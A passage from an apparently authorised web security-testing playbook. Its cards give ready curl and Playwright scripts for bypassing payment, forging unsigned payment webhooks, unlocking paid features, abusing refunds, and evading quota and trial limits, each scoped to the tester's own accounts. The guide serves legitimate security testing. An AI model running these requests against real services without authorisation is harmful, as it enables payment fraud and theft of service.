  (`/checkout/success?session_id=`, `/payment/return?status=`, `/order-received/<id>?key=`), a client-called
  "complete", "confirm" or "activate" endpoint, the provider notification route (webhook, IPN, callback) on the
  target's own host, and wizards in which payment is one step among several (plan choice → payment →
  provisioning). Parameters to watch: `status`, `paid`, `payment_status`, `transaction_id`, `payment_intent`,
  `session_id`, `order_id`, `payment_method`, `wallet_id`.
- **Test:** fulfilment trusts what the browser reports about the payment instead of asking the provider about
  this order, this amount and this currency. Skip the payment step and call the completion step; claim success
  with an unpaid session; present a genuine payment of a cheap order for an expensive one; name a payment method
  that is not a funded method of ours; post an unsigned provider event for our own order.
- **How:**
  ```bash
  D="$E/evidence/$H/BIZ-007"; mkdir -p "$D"
  st(){ curl -sS "${HDR[@]}" $A "$T/api/orders/$O" -o "$D/order_$1.json"; printf '%s: ' "$1"
        grep -Eo '"(status|payment_status|paid|amount_paid|total)"\s*:\s*"?[A-Za-z0-9._-]+' "$D/order_$1.json" | tr '\n' ' '
        curl -sS "${HDR[@]}" $A "$T/api/me" | grep -Eo '"(plan|tier|subscription_status)"\s*:\s*"?[A-Za-z0-9._-]+' | tr '\n' ' '; echo; }
  # 0. create the order and stop before the provider; note the order id and the unpaid session id
  curl -sS "${HDR[@]}" $A -X POST "$T/api/checkout/session" -H 'Content-Type: application/json' \
    -d '{"plan_id":"<plan id>"}' -o "$D/session.json"
  O='<order id>'; S='<unpaid session id>'; st 0_created
  # 1. skip: the completion step without any payment
  curl -sS "${HDR[@]}" $A -X POST "$T/api/orders/$O/complete" -H 'Content-Type: application/json' -d '{}' -D- -o "$D/skip.json"; st 1_after_skip
  # 2. claim: the return URL and the completion call with the unpaid session and a success status
  curl -sS "${HDR[@]}" $A "$T/checkout/success?session_id=$S&order_id=$O&status=success&paid=true" -D- -o "$D/return.html"; st 2_after_return
  curl -sS "${HDR[@]}" $A -X POST "$T/api/orders/$O/complete" -H 'Content-Type: application/json' \
    -d '{"status":"succeeded","payment_status":"paid","transaction_id":"biz007-nonexistent"}' -D- -o "$D/claim.json"; st 3_after_claim
  # 3. a payment method that is not a funded method of ours (never an id that could belong to a customer)
  for m in '{"payment_method":"invoice"}' '{"payment_method":"free"}' '{"payment_method":"offline"}' \
           '{"payment_method_id":"00000000-0000-0000-0000-000000000000"}' '{"wallet_id":"00000000-0000-0000-0000-000000000000"}'; do
    curl -sS "${HDR[@]}" $A -X POST "$T/api/orders/$O/pay" -H 'Content-Type: application/json' -d "$m" -o /dev/null -w "%{http_code} $m\n"; sleep 1; done; st 4_after_method
  # 4. mismatch: R is the reference of ONE genuine payment of the cheapest item (test cards or an operator-approved
  #    purchase; skip this step otherwise); present it for the expensive order O
  curl -sS "${HDR[@]}" $A -X POST "$T/api/orders/$O/complete" -H 'Content-Type: application/json' \
    -d '{"session_id":"<R>","payment_intent":"<R>"}' -D- -o "$D/mismatch.json"; st 5_after_mismatch
  # 5. an unsigned provider event for our own order, posted to the target's notification route (body shaped for the provider in use)
  curl -sS "${HDR[@]}" -X POST "$T/webhooks/payments" -H 'Content-Type: application/json' -D- -o "$D/webhook.txt" \
    -d "{\"type\":\"checkout.session.completed\",\"data\":{\"object\":{\"id\":\"$S\",\"payment_status\":\"paid\",\"client_reference_id\":\"$O\",\"metadata\":{\"order_id\":\"$O\"}}}}"; st 6_after_webhook
  ```
- **Proof:** order O in a paid or active state in our own account, or the plan's entitlement in force (`/api/me`
  shows the paid plan and one paid feature answers), with no payment behind it: the request chain never visits
  the provider, the account's payment history lists no charge and no receipt arrived. For the mismatch: two
  orders and one receipt. One order of the cheapest plan; cancel or downgrade after capture.
- **Not a finding when:** the order shows "processing" and reverts when no server-to-server confirmation arrives
  (re-read after 15 minutes and again after the session's expiry time); the success page renders and nothing is
  granted; the notification route answers 200 to everything and ignores the event (read the order, not the
  status code); the product has a legitimate zero-price checkout or a trial that starts without payment;
  "invoice" or "pay later" is a real method for this account type; the environment runs on test-mode keys.
- **Escalate:** the unsigned-event variant works for any order id: prove it on ours and state that the id is the
  only input. A completion GET that changes state is also a CSRF: CSR chapter. A client-held signed blob as the
  "payment result": JWT-001, DSR-002. Paying with a stored method of another account is an object-reference bug
  (BAC chapter); prove it only against account B and only up to the order state. Amount wrong at session
  creation: BIZ-001.

### BIZ-008 · A paid plan's feature works when its API is called from an account on the free plan

| | |
|---|---|
| **Severity** | Medium standalone; High when the request changes the stored plan so that every paid feature follows; Low for a cosmetic paid setting |
| **Requires** | payments, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Missing Authorization · CWE-862 |
| **Prior art** | #3183520, #953083, #344468, #520623 |

- **Where:** the features the pricing page lists as paid, tested with free-plan account A. Their endpoints are
  found without paying: bundles carry the routes and API calls of every plan, and the profile or bootstrap
  response (`/api/me`, `/api/config`, `window.__INITIAL_STATE__`) carries the flags that hide them (`plan`,
  `tier`, `isPremium`, `features`, `entitlements`, `featureFlags`). When the operator holds a paid test account,
  capture the paid request there and replay it as A. Include paid-only values of free endpoints: private
  visibility, a read-only role, a custom domain, branding removal, an export format, a higher limit. A product
  that sells one-off goods and has no plans has nothing to test: mark the card `skipped` with that reason.
- **Test:** the plan check lives in the front end (a hidden button, a route guard, an upsell dialog) and the
  endpoint checks only that the session is valid. Call the paid endpoint as A, set the paid-only value on an
  endpoint A may use, and read back whether the server stored and honoured it. Rewriting flags in the browser is
  a way to discover calls, never the proof.
- **How:**
  ```bash
  D="$E/evidence/$H/BIZ-008"; mkdir -p "$D"
  # 0. A's plan as the server states it, and the gates named in the bundles
  curl -sS "${HDR[@]}" $A "$T/api/me" -o "$D/00-me.json"
  grep -Eo '"(plan|tier|subscription|is_premium|isPremium|features|entitlements)"\s*:\s*[^,}]{1,80}' "$D/00-me.json"
  grep -rEoh '(isPremium|isPro|requiresPlan|planRequired|upgradeRequired|featureFlags?|entitlements?)[^;]{0,120}' "$E/recon/$H/js/" | sort -u | head -40
  # 1. the paid feature's own endpoint, called by the free account
  curl -sS "${HDR[@]}" $A -X POST "$T/api/exports" -H 'Content-Type: application/json' \
    -d '{"format":"csv","scope":"all"}' -D "$D/01-paid-call.hdr" -o "$D/01-paid-call.json" -w '%{http_code}\n'
  # 2. a paid-only value on an endpoint the free plan may call, then the read-back
  curl -sS "${HDR[@]}" $A -X PATCH "$T/api/projects/<our project id>" -H 'Content-Type: application/json' \
    -d '{"visibility":"private","remove_branding":true,"custom_domain":"biz008.example"}' -D- -o "$D/02-paid-value.json"
  curl -sS "${HDR[@]}" $A "$T/api/projects/<our project id>" -o "$D/02-readback.json"
  # 3. repeat 1 and 2 on every API version and host the bundles name for the feature (/api/v1/, /api/v2/, the mobile API)
  # 4. optional discovery with the scriptable browser: show the UI a top-tier plan, log the calls it then makes
  python3 - "$T" '<A storage state file>' <<'PY'
  import re, sys
  from playwright.sync_api import sync_playwright
  T, state = sys.argv[1:3]
  def unlock(route):
      r = route.fetch(); b = r.text()
      b = re.sub(r'"(plan|tier)"\s*:\s*"[^"]*"', r'"\1":"enterprise"', b)
      b = re.sub(r'"(is_?[Pp]remium|is_?[Pp]ro)"\s*:\s*false', r'"\1":true', b)
      route.fulfill(response=r, body=b)
  with sync_playwright() as p:
      ctx = p.chromium.launch().new_context(storage_state=state, extra_http_headers={'<programme header>': '<value>'})
      page = ctx.new_page(); page.route('**/api/me*', unlock)
      page.on('response', lambda r: '/api/' in r.url and print(r.status, r.request.method, r.url))
      for path in ('<paid screen 1>', '<paid screen 2>'):
          page.goto(T + path); page.wait_for_timeout(4000)
  PY
  ```
- **Proof:** the paid feature's result in the free account: the export file, or the object stored with the
  paid-only value and behaving accordingly, beside `/api/me` showing the free plan at the same minute and the
  pricing page line that sells the feature. Used once.
- **Not a finding when:** the UI unlocks after the flag rewrite and every paid call answers 402 or 403 (the flags
  are cosmetic, which is the correct design: "I can see the premium screen" is closed as informative); the
  endpoint answers 200 with an upsell payload or an empty result; the value is stored and ignored at use (the
  branding is still rendered, the domain never activates) or reverted by a job; the account is inside a trial,
  a grace period or a grandfathered plan; the feature is free and the pricing page is out of date; the flag
  gates an unreleased feature with no price attached (lower value: BIZ-009).
- **Escalate:** writing `plan`, `tier` or `features` on the account or organisation object is mass assignment
  (API chapter) and raises this to high. A plan check missing on one mutation of a GraphQL schema: GQL-006. A
  paid value that is a higher quota: BIZ-011. Paid endpoints that stay open after a trial ended: BIZ-012. Each
  unlocked feature is new surface for other chapters (webhooks, imports, custom domains): record the facts with
  `scripts/sane fact set`.

### BIZ-009 · A rule the interface enforces (locked field, disabled option, input limit) is not enforced by the API

| | |
|---|---|
| **Severity** | Low standalone; Medium when the rule protects other users or the business (a reserved name, a locked identity field, a mandatory security setting, an order rule) |
| **Requires** | login, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Client-Side Enforcement of Server-Side Security · CWE-602 |
| **Prior art** | #361960, #1770797, #3766455, #980898 |

- **Where:** every place the UI says no. Greyed-out or read-only inputs (an e-mail locked after SSO, a verified
  legal name, a username after its allowed changes), `maxlength`, `min`, `max` and `pattern` attributes,
  disabled options in selects, hidden inputs with fixed values, mandatory checkboxes, settings the organisation
  enforces (password on share links, expiry dates), per-order rules ("up to 3 extras", "2 per customer"),
  reserved names and prefixes, blocked e-mail domains, formats validated in JavaScript (VAT numbers, dates),
  "can be changed once every 30 days". Pick the rules whose breach affects someone other than us.
- **Test:** the form validates and the endpoint stores whatever arrives. Send the forbidden value straight to the
  endpoint the form uses and read the stored value back. When refused, try the same field through another
  path: the bulk or import endpoint, an older API version, a form-encoded body, the field nested in its parent
  object, and for deny-lists a different case or a look-alike character.
- **How:**
  ```bash
  D="$E/evidence/$H/BIZ-009"; mkdir -p "$D"
  # 0. inventory of client-side rules in the saved pages and bundles
  grep -rEoh '(maxlength|minlength|max|min|pattern)="[^"]{1,60}"|<(input|select|textarea)[^>]{0,200}\b(readonly|disabled)\b[^>]{0,80}' "$E/recon/$H/" | sort | uniq -c | sort -rn | head -40
  grep -rEoh '\.(max|min|length|matches|oneOf|notOneOf)\([^)]{1,80}\)|(cannot|can.t|not allowed to) (be )?(change|edit|modif)[a-z ]{0,40}' "$E/recon/$H/js/" | sort | uniq -c | sort -rn | head -40
  # 1. control: an allowed value is stored
  curl -sS "${HDR[@]}" $A -X PATCH "$T/api/profile" -H 'Content-Type: application/json' -d '{"display_name":"biz009 control"}' -o "$D/01-control.json" -w '%{http_code}\n'
  # 2. the forbidden values, one per request
  LONG=$(head -c 600 /dev/zero | tr '\0' 'a')
  for body in \
    '{"email":"<another address we own>"}' \
    '{"username":"<reserved prefix>biz009"}' \
    '{"country":"<a value the form does not offer>"}' \
    '{"birth_date":"2015-01-01"}' \
    "{\"bio\":\"$LONG\"}"; do
    n=$(printf %s "$body" | md5sum | cut -c1-8)
    curl -sS "${HDR[@]}" $A -X PATCH "$T/api/profile" -H 'Content-Type: application/json' -d "$body" \
      -o "$D/02-test-$n.json" -w "%{http_code} ${body:0:60}\n"; sleep 1; done
  # 3. what the server stored
  curl -sS "${HDR[@]}" $A "$T/api/profile" -o "$D/03-readback.json"
  # 4. the same field through other paths when step 2 was refused
  curl -sS "${HDR[@]}" $A -X POST "$T/profile" --data-urlencode 'username=<reserved prefix>biz009' -o /dev/null -w '%{http_code} form\n'
  curl -sS "${HDR[@]}" $A -X PUT "$T/api/v1/users/<A user id>" -H 'Content-Type: application/json' -d '{"user":{"username":"<reserved prefix>biz009"}}' -o /dev/null -w '%{http_code} v1 nested\n'
  # 5. a per-order rule: more options than the form allows
  curl -sS "${HDR[@]}" $A -X POST "$T/api/cart/items" -H 'Content-Type: application/json' \
    -d '{"sku":"<sku>","quantity":1,"modifiers":["<m1>","<m2>","<m3>","<m4>","<m5>"]}' -D- -o "$D/05-modifiers.json"
  ```
- **Proof:** the read-back GET showing the forbidden value stored in our account, beside the evidence of the rule
  (a screenshot of the locked field, or the validator's source line) and one sentence on whom the breach
  affects: a staff-like username other users see, a locked e-mail changed without the check the lock stands
  for, an order whose receipt lists five extras at the price of three.
- **Not a finding when:** the rule is cosmetic (a longer bio, an extra tag) and nobody else is affected: closed
  as informative; the request answers 200 and the stored value is the old or a truncated one; the API documents
  a different limit than the UI shows (the documentation wins); the option is hidden for roll-out reasons and
  choosing it harms nobody.
- **Escalate:** a locked e-mail or phone field: BIZ-015, then the AUT chapter for takeover paths. A reserved or
  staff-like name: say who sees it and where. A numeric rule: BIZ-002, BIZ-011. A hidden field that carries a
  price or a role: BIZ-001, BAC chapter. Markup stored past a client-side filter: XSS chapter.

### BIZ-010 · A refund, cancellation or downgrade returns the money while the entitlement stays

| | |
|---|---|
| **Severity** | Medium standalone for one refunded purchase whose entitlement stays; High when the entitlement is stored value or the refund exceeds the payment |
| **Requires** | payments, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | high |
| **Weakness** | Business Logic Errors · CWE-840 |
| **Prior art** | #307239, #614523, #1257428 |

- **Where:** self-service flows that reverse a payment: cancel order, cancel subscription with a pro-rated
  refund, downgrade, remove seats, return an item, a money-back button, delete a workspace that holds credit,
  cancel a booking for a fee; account credits and credit notes issued on plan changes; the seller-side refund
  endpoint of a marketplace where we hold both the buyer and the seller test account. A product whose refunds
  exist only through support staff has nothing to test here: mark the card `skipped` with that reason.
- **Test:** reversal and revocation are two code paths and only the first runs, or the amount reversed is
  computed from data that changed after payment. After one genuine purchase and its reversal, check whether the
  licence still validates, the credits remain, the plan stays active beyond the paid period, the refund can be
  requested twice or above the amount paid, and whether one upgrade-downgrade cycle leaves more account credit
  than was charged. This card needs one real payment: get the operator's approval first.
- **How:**
  ```bash
  D="$E/evidence/$H/BIZ-010"; mkdir -p "$D"
  snap(){ for p in /api/me /api/billing/subscription /api/billing/credits /api/billing/payments; do
            curl -sS "${HDR[@]}" $A "$T$p" -o "$D/$1$(printf %s "$p" | tr '/' '_').json"; done
          date -u +"# $1 %Y-%m-%dT%H:%M:%SZ" | tee -a "$D/timeline.txt"; }
  snap 0_before          # now make ONE purchase of the cheapest paid item through the normal flow
  snap 1_after_purchase
  # 1. reverse it through the product's own flow
  curl -sS "${HDR[@]}" $A -X POST "$T/api/orders/<order id>/refund" -H 'Content-Type: application/json' \
    -d '{"reason":"requested_by_customer"}' -D- -o "$D/refund.json"; snap 2_after_refund
  # 2. is the entitlement still usable?
  curl -sS "${HDR[@]}" $A -X POST "$T/api/licenses/validate" -H 'Content-Type: application/json' \
    -d '{"key":"<licence key from the order>"}' -D- -o "$D/license_after_refund.json"
  curl -sS "${HDR[@]}" $A "$T/api/downloads/<purchased item id>" -o /dev/null -w 'download after refund: %{http_code} %{size_download}\n'
  # 3. the same refund again, then a refund one minor unit above the amount paid
  curl -sS "${HDR[@]}" $A -X POST "$T/api/orders/<order id>/refund" -H 'Content-Type: application/json' \
    -d '{"reason":"requested_by_customer"}' -o "$D/refund_replay.json" -w 'replay %{http_code}\n'
  curl -sS "${HDR[@]}" $A -X POST "$T/api/orders/<order id>/refund" -H 'Content-Type: application/json' \
    -d '{"amount":"<amount paid plus one minor unit>"}' -o "$D/refund_over.json" -w 'over %{http_code}\n'
  # 4. a fee the client can drop from the cancellation request
  curl -sS "${HDR[@]}" $A -X POST "$T/api/bookings/<booking id>/cancel" -H 'Content-Type: application/json' \
    -d '{"cancellation_fee":0}' -D- -o "$D/cancel_no_fee.json"
  # 5. one upgrade and immediate downgrade: is the credit larger than the charge?
  curl -sS "${HDR[@]}" $A -X POST "$T/api/billing/subscription" -H 'Content-Type: application/json' -d '{"plan_id":"<higher plan>"}' -o "$D/upgrade.json"; snap 3_after_upgrade
  curl -sS "${HDR[@]}" $A -X POST "$T/api/billing/subscription" -H 'Content-Type: application/json' -d '{"plan_id":"<original plan>"}' -o "$D/downgrade.json"; snap 4_after_downgrade
  snap 5_final           # repeat this line after the provider's settlement delay
  ```
- **Proof:** a timeline from our own account: payment P for item X; the refund of P (refund record or e-mail);
  then, after the refund settled, X still usable (the licence validates, the credits are in the balance, the
  plan is active past the paid period), each with a timestamp. For proration: an account credit larger than the
  sum charged. One purchase; the net amount stated for reversal; nothing spent or withdrawn.
- **Not a finding when:** the plan stays active until the end of the period already paid for and the refund
  covers only the unused part, or no refund is given; the refund is pending and the entitlement is revoked when
  it settles; a consumable was delivered before the refund (a file we downloaded is not an entitlement); credits
  are clawed back to a negative balance that blocks further use; the refund depends on persuading support staff
  (`social-engineering`); the idea is a chargeback at the bank, which is not a flaw of the target and is never
  attempted.
- **Escalate:** a reward earned by the refunded purchase that stays (points, referral bonus): BIZ-006. Refund
  and use sent at the same moment: RAC chapter. Refund in another currency at the same number: BIZ-003. A
  seller-side refund endpoint that answers the buyer: BAC chapter.

### BIZ-011 · A plan quota (seats, projects, storage, usage) is exceeded through a path the counter does not cover

| | |
|---|---|
| **Severity** | Low standalone for an unpriced soft limit; Medium when the quota is a priced unit (seats, storage, usage credits) |
| **Requires** | payments\|limited-action, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Allocation of Resources Without Limits or Throttling · CWE-770 |
| **Prior art** | #1068301, #246803, #3102890, #1446090 |

- **Where:** every counted resource with a stated limit: team seats, projects, workspaces, boards, storage
  bytes, monthly usage (messages, builds, AI credits), items per order, invitations, custom domains. The limits
  are on the pricing page and in the usage or billing view. For each resource list all the paths that create or
  grow it: the main create endpoint, bulk create, import, duplicate or clone, restore from trash, unarchive,
  transfer in from another workspace of ours, pending invitations, and any field in which the client reports a
  size or a count (`size`, `content_length`, `count`, `seats`). No stated limit anywhere: mark the card
  `skipped` with that reason.
- **Test:** the limit is checked in the handler behind the "new" button by counting rows, and the other handlers
  that add rows skip the check; or the counter trusts a size the client declares. Fill the quota by the main
  path, confirm that one more is refused there, then try one more through each alternative path and through a
  delete-create-restore sequence. Exceed by the minimum and remove the extras afterwards.
- **How:**
  ```bash
  D="$E/evidence/$H/BIZ-011"; mkdir -p "$D"
  cnt(){ curl -sS "${HDR[@]}" $A "$T/api/projects" -o "$D/list_$1.json"; printf '%s: %s names; ' "$1" "$(grep -o '"name"' "$D/list_$1.json" | wc -l)"
         curl -sS "${HDR[@]}" $A "$T/api/usage" | grep -Eo '"(used|limit|quota|seats_used|seats|storage_used)"\s*:\s*"?-?[0-9]+' | tr '\n' ' '; echo; }
  mk(){ curl -sS "${HDR[@]}" $A -X POST "$T/api/projects" -H 'Content-Type: application/json' -d "{\"name\":\"biz011-$1\"}" \
          -o "$D/create_$1.json" -w "%{http_code} create $1\n"; sleep 1; }
  cnt 0_start
  for i in 1 2 3; do mk "$i"; done; cnt 1_at_limit           # the free limit in this example is 3
  mk over; cnt 2_control                                      # control: the main path refuses the 4th
  # alternative paths for the 4th object
  curl -sS "${HDR[@]}" $A -X POST "$T/api/projects/<id of biz011-1>/duplicate" -o "$D/duplicate.json" -w '%{http_code} duplicate\n'
  curl -sS "${HDR[@]}" $A -X POST "$T/api/projects/bulk" -H 'Content-Type: application/json' \
    -d '{"projects":[{"name":"biz011-b1"},{"name":"biz011-b2"}]}' -o "$D/bulk.json" -w '%{http_code} bulk\n'
  # also: import from file or template, transfer in from our second workspace, unarchive
  # delete one, create one, restore the deleted one
  curl -sS "${HDR[@]}" $A -X DELETE "$T/api/projects/<id of biz011-3>" -o /dev/null -w '%{http_code} delete\n'; mk refill
  curl -sS "${HDR[@]}" $A -X POST "$T/api/projects/<id of biz011-3>/restore" -o "$D/restore.json" -w '%{http_code} restore\n'; cnt 3_after_alternatives
  # storage: a declared size smaller than the bytes sent (1 MiB, run with the storage quota nearly full)
  head -c 1048576 /dev/urandom > "$D/1m.bin"
  curl -sS "${HDR[@]}" $A -X POST "$T/api/uploads" -H 'Content-Type: application/json' -d '{"name":"biz011.bin","size":1}' -o "$D/upload_init.json"
  curl -sS "${HDR[@]}" $A -X PUT "$T/api/uploads/<upload id>" -H 'Content-Type: application/octet-stream' --data-binary @"$D/1m.bin" -o "$D/upload_put.json" -w '%{http_code} put\n'
  curl -sS "${HDR[@]}" $A -X POST "$T/api/uploads" -H 'Content-Type: application/json' -d '{"name":"biz011n.bin","size":-1048576}' -o "$D/upload_negative.json" -w '%{http_code} negative size\n'; cnt 4_after_upload
  # seats: invitations beyond the seat count (the addresses are our own aliases)
  for i in 1 2 3; do curl -sS "${HDR[@]}" $A -X POST "$T/api/team/invitations" -H 'Content-Type: application/json' \
    -d "{\"email\":\"<our mailbox>+biz011-$i@<our domain>\"}" -o /dev/null -w "%{http_code} invite $i\n"; sleep 1; done
  # a seat count the client sets, one above what is paid (only with no card on file, otherwise the extra seat is billed)
  curl -sS "${HDR[@]}" $A -X PUT "$T/api/billing/seats" -H 'Content-Type: application/json' \
    -d '{"seats":<paid seats + 1>,"paid_seats":<paid seats>}' -D- -o "$D/seats.json"; cnt 5_after_seats
  ```
- **Proof:** the account's own usage view or object list showing more usable objects than the plan allows: the
  control refusal, the alternative request, the list, and one write to the extra object that succeeds (it is
  usable, not merely stored). For storage: the usage figure below the bytes actually held. Exceed by one; delete
  the extras after capture and list them for `cleanup.md`.
- **Not a finding when:** the limit is soft by design (overage is billed, or a grace allowance is documented);
  the extra object exists but is locked or read-only, or the account is flagged over quota and blocked; pending
  invitations do not use seats by design and acceptance is refused at the limit (accept one with our alias to
  see); the usage counter is eventually consistent and catches up within minutes; objects created on a higher
  plan remain readable after a downgrade (normal retention); the limit is a request rate (requests per minute),
  which is `rate-limit` material and not this card.
- **Escalate:** several creates sent in one burst at the limit: RAC chapter (#3221185 and #3226838 are that
  form). A request field that raises the limit itself (`"limit":999`, `"max_projects":999`): BIZ-008 and the API
  chapter. A trusted client-declared file size also defeats upload size checks: UPL chapter. For usage quotas
  with a real unit cost (AI credits, SMS), state the vendor's cost per unit in the report.

### BIZ-012 · A trial is started again or extended on an account that already used it

| | |
|---|---|
| **Severity** | Low standalone for one extra trial period; Medium when the trial renews without bound or the client sets its end date |
| **Requires** | limited-action, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Business Logic Errors · CWE-840 |
| **Prior art** | #865828, #1670304, #947728 |

- **Where:** the trial start and subscription endpoints (`/api/billing/trial`, a subscription create or update
  carrying `trial`, `trial_period_days` or `trial_end`), the cancel, reactivate and downgrade flows, switches
  between plans or products that each offer a trial, the "extend trial" action, the step that demands a card
  before the trial starts, and account deletion followed by re-registration where `signup` is true. A product
  without a trial has nothing to test: mark the card `skipped` with that reason, or, when nothing else on the
  asset is a limited action, correct the fact (`scripts/sane fact set "$H" limited-action=0 --ev "..."`).
- **Test:** "has used a trial" is not stored against a stable identity, or the trial window is computed from a
  field the client supplies or can reset. On an account whose trial was used: start it again, start another
  plan's trial, send a far-future end date, run one cancel-reactivate cycle and see whether the end date moves,
  start the card-required trial without the card step. After the end time has passed, call one paid endpoint.
- **How:**
  ```bash
  D="$E/evidence/$H/BIZ-012"; mkdir -p "$D"   # use an account with no card on file: a refused trial must not become a charge
  sub(){ curl -sS "${HDR[@]}" $A "$T/api/billing/subscription" -o "$D/sub_$1.json"; printf '%s: ' "$1"
         grep -Eo '"(status|plan|trial_start|trial_end|trial_ends_at|trial_used|has_had_trial)"\s*:\s*"?[A-Za-z0-9:._+-]+' "$D/sub_$1.json" | tr '\n' ' '; echo; }
  sub 0_start
  # 1. start a trial again on the account that already had one, then the trial of another plan or interval
  curl -sS "${HDR[@]}" $A -X POST "$T/api/billing/trial" -H 'Content-Type: application/json' -d '{"plan_id":"<plan id>"}' -D- -o "$D/restart.json"; sub 1_after_restart
  curl -sS "${HDR[@]}" $A -X POST "$T/api/billing/trial" -H 'Content-Type: application/json' -d '{"plan_id":"<another plan or interval>"}' -o "$D/restart_other.json"; sub 2_after_other_plan
  # 2. a trial window chosen by the client (ten years ahead)
  T_END=$(( $(date +%s) + 315360000 ))
  for body in "{\"plan_id\":\"<plan id>\",\"trial_end\":$T_END}" '{"plan_id":"<plan id>","trial_period_days":3650}' \
              '{"plan_id":"<plan id>","trial":true,"trial_days":3650}'; do
    curl -sS "${HDR[@]}" $A -X POST "$T/api/billing/subscription" -H 'Content-Type: application/json' -d "$body" \
      -o /dev/null -w "%{http_code} ${body:0:70}\n"; sleep 1; done; sub 3_after_window
  curl -sS "${HDR[@]}" $A -X PATCH "$T/api/billing/subscription" -H 'Content-Type: application/json' \
    -d "{\"trial_end\":$T_END}" -o "$D/patch_trial_end.json"; sub 4_after_patch
  # 3. reset by state change: cancel, then reactivate
  curl -sS "${HDR[@]}" $A -X POST "$T/api/billing/subscription/cancel" -o /dev/null -w '%{http_code} cancel\n'
  curl -sS "${HDR[@]}" $A -X POST "$T/api/billing/subscription/reactivate" -o /dev/null -w '%{http_code} reactivate\n'; sub 5_after_cycle
  # 4. the card-required trial without the card step
  curl -sS "${HDR[@]}" $A -X POST "$T/api/billing/trial" -H 'Content-Type: application/json' \
    -d '{"plan_id":"<card-required plan>","payment_method_id":null}' -o "$D/trial_no_card.json" -w '%{http_code} no card\n'
  # 5. once trial_end has passed: does a paid endpoint still answer?
  curl -sS "${HDR[@]}" $A -X POST "$T/api/exports" -H 'Content-Type: application/json' -d '{"format":"csv"}' -o /dev/null -w 'paid call after expiry: %{http_code}\n'
  ```
- **Proof:** the subscription object of one account showing a second `trial_start`, or a trial end later than
  the first trial allowed, beside the record of the first trial; or a paid endpoint answering after `trial_end`
  with the account still unpaid. One restart or one extension.
- **Not a finding when:** the new trial came from registering another account with a new address, a plus-alias
  or a disposable mailbox: programmes treat that as accepted risk for their fraud team; the second trial is an
  offer the vendor makes (win-back, one trial per product); `trial_end` is accepted in the request and absent
  from the stored object; paid features stay on because the downgrade job runs once a day (check again after 24
  hours); the extended trial has a card on file and converts to a paid plan by itself.
- **Escalate:** paid endpoints open after expiry are a missing plan check: BIZ-008. Parallel trial starts: RAC
  chapter (#1087188 is that form). A low role extending the organisation's trial (#947728): BAC chapter. A
  mass-assigned `trial_end`: API chapter.

### BIZ-013 · An object in a paid, submitted, cancelled or expired state still accepts a change that state forbids

| | |
|---|---|
| **Severity** | Medium standalone; High when a paid order is fulfilled with contents added after payment; Low when only our own closed record changes |
| **Requires** | state-change, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Business Logic Errors · CWE-840 |
| **Prior art** | #331691, #976441, #291822, #1139528 |

- **Where:** objects with a life cycle. Write each one down as states and transitions before testing: cart →
  payment pending → paid → fulfilled → refunded; draft → submitted → approved → published; invited → accepted
  → removed; open → closed; trial → active → cancelled; wizard step 1 → 2 → 3 (onboarding, identity check,
  application forms). The requests to aim at are each transition's own endpoint and the generic update
  endpoint of the object (`PATCH /api/<object>/<id>`), which often has no state check at all.
- **Test:** handlers check who the caller is and not which state the object is in. Bring an object to a late
  state through the UI, then replay requests that belong to an earlier state, write the state field directly,
  use a token after its end of life, and call a later step without the one before it. For checkout: create the
  payment session for a cheap cart, add a line, and see whether the session still carries the old amount.
- **How:**
  ```bash
  D="$E/evidence/$H/BIZ-013"; mkdir -p "$D"; O='<order id>'
  st(){ curl -sS "${HDR[@]}" $A "$T/api/orders/$O" -o "$D/order_$1.json"; printf '%s: ' "$1"
        grep -Eo '"(status|state|total|amount_paid|items_count|locked)"\s*:\s*"?[A-Za-z0-9._-]+' "$D/order_$1.json" | tr '\n' ' '; echo; }
  # 1. change after the amount was fixed: session created for the cheap cart, then a line is added
  curl -sS "${HDR[@]}" $A -X POST "$T/api/checkout/session" -H 'Content-Type: application/json' -d "{\"order_id\":\"$O\"}" -o "$D/session.json"; st 1_session_created
  curl -sS "${HDR[@]}" $A -X POST "$T/api/orders/$O/items" -H 'Content-Type: application/json' \
    -d '{"sku":"<second sku>","quantity":1}' -D- -o "$D/add_after_session.json"; st 2_after_add
  grep -Eo '"(amount|amount_total)"\s*:\s*[0-9]+' "$D/session.json"      # still the old amount, and still payable?
  # 2. backwards moves and direct state writes on a cancelled or completed object
  for body in '{"status":"active"}' '{"status":"paid"}' '{"state":"open"}' '{"cancelled":false}' '{"locked":false}'; do
    curl -sS "${HDR[@]}" $A -X PATCH "$T/api/orders/$O" -H 'Content-Type: application/json' -d "$body" -o /dev/null -w "%{http_code} $body\n"; sleep 1; done; st 3_after_state_writes
  # 3. edit after submit: a submitted or approved record of ours takes an update
  curl -sS "${HDR[@]}" $A -X PATCH "$T/api/expenses/<submitted expense id>" -H 'Content-Type: application/json' \
    -d '{"amount":"<a higher amount>"}' -D- -o "$D/edit_after_submit.json"
  # 4. use after end of life: an invitation of ours that A revoked, or that was already accepted once (needs second account B)
  curl -sS "${HDR[@]}" $B -X POST "$T/api/invitations/<revoked token>/accept" -D- -o "$D/accept_revoked.json"
  # 5. skip forward: the last step of a wizard without the step before it
  curl -sS "${HDR[@]}" $A -X POST "$T/api/onboarding/complete" -H 'Content-Type: application/json' -d '{}' -D- -o "$D/skip_step.json"
  curl -sS "${HDR[@]}" $A "$T/api/me" | grep -Eo '"(onboarding|onboarded|kyc_status|step|status)[a-z_]*"\s*:\s*"?[A-Za-z0-9._-]+'
  ```
  Paying the stale session in step 1 is the proof for the checkout case and costs the price of the cheap cart:
  do it once, with test cards or the operator's approval. Without the payment the result is a `candidate`.
- **Proof:** the object's server-side record in a state the product's rules make impossible, in our own
  accounts: a paid order whose amount paid is the cheap cart while its lines include the added product; a
  revoked invitation that produced a membership; an approved record whose amount changed after approval. The
  state before, the request, the state after, and the rule. An order that holds unpaid items is cancelled
  straight after capture.
- **Not a finding when:** the change is accepted and the order is re-priced with the difference demanded before
  fulfilment; the session amount follows the cart; edits after submission are allowed and send the record back
  to review; the state field is echoed in the response and not stored; reopening is a feature (tickets,
  threads); the "expired" page is a cached copy and the action behind it fails.
